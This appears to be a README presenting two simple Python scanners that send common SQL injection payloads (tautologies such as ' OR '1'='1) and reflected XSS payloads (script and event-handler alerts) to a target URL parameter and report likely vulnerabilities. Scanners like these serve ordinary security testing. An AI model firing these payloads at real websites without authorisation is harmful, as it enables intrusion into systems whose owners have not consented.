===========================================
<BR>
               SQL INJECTION
<BR>
===========================================
Define the URL of the target website:
<br>
url = "http://example.com/vulnerable_page.php"

Define a list of SQL injection payloads to test:
<br>
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR 1=1-- ",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' /* ",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1' OR '1'='1' /* "
]

Define a function to test for SQL injection:
<br>
def test_sql_injection(url, payloads):
    for payload in payloads:
        # Construct the full URL with the payload
        test_url = f"{url}?id={payload}"

        try:
            # Send the HTTP request
            response = requests.get(test_url)

            # Check if the payload is reflected in the response
            if "SQL" in response.text or "syntax" in response.text or "error" in response.text:
                print(f"Potential SQL injection vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} did not cause an SQL error.")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

Call the function to run the test:
<br>
test_sql_injection(url, payloads)

===========================================
  <br>
                   XSS
  <br>
===========================================
First, make sure you have the requests library installed. If not, you can install it using pip:
<br>
pip install requests

Explanation:
URL Definition: The URL of the target website is defined as url.
<br>
url = "http://example.com/vulnerable_page.php"

Payloads List: A list of common XSS payloads is defined. These payloads will be tested to see if they are reflected in the response.
<br>
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover over me</div>"
]

Function Definition (test_xss): This function takes the URL and payloads as parameters and iterates through each payload:
<br>
Construct URL: For each payload, the script constructs a test URL by appending the payload to the query parameter input.
<br>
def test_xss(url, payloads):
    for payload in payloads:
        # Construct the full URL with the payload
        test_url = f"{url}?input={payload}"

        try:

Send Request: It sends an HTTP GET request to the constructed URL.
<br>
response = requests.get(test_url)

Check Response: It checks if the payload is reflected in the response text. If it is, it prints a message indicating a potential XSS vulnerability. If not, it prints a message that the payload did not 
trigger an XSS vulnerability.
<br>
if payload in response.text:
                print(f"Potential XSS vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} did not trigger an XSS vulnerability.")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

Error Handling: The script includes error handling to catch and print any exceptions that occur during the HTTP request.
<br>
test_xss(url, payloads)

=========================================
SQLI.py & XSS.py the script for testing vulnerability on the website with python language.

You can run this script for testing the website with following step:

pip install requirements
<br>
chmod +x filename.py
<br>
python3 filename.py

put target url for checking vulnerable of SQL Injection



Happy Hacking..!!
